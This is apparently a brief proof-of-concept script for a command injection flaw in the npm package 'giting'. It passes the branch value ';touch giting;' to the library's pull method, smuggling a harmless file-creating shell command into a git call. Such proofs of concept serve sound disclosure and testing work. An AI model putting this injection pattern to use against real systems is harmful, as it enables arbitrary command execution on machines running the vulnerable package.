const Test = require("giting");

let injection_command = ";touch giting;";
var test = new Test({ workDir: "./" });
repo = {
  organization: "./",
  name: "./",
  branch: injection_command,
};
test.pull(repo, function () { });
